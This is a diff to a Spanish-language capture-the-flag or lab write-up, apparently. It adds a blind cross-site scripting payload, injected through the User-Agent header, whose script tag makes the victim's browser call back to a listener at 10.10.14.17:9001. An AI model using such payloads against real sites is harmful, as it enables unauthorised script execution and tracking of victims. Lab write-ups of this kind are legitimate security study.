@@ -122,6 +122,11 @@ interceptamos el error que se genera para poder ver el informe
 
 ### User-Agent
 hacemos la misma inyección pero esta ves en el `User-Agent` y estaremos a la escucha para poder ver la petición que se genera
+
+```python
+<script>var i=new Image(); i.src="http://10.10.14.17:9001/XSS";</script>
+```
+
 ![[Pasted image 20240611203622.png]]
 
 ### Servidor de python
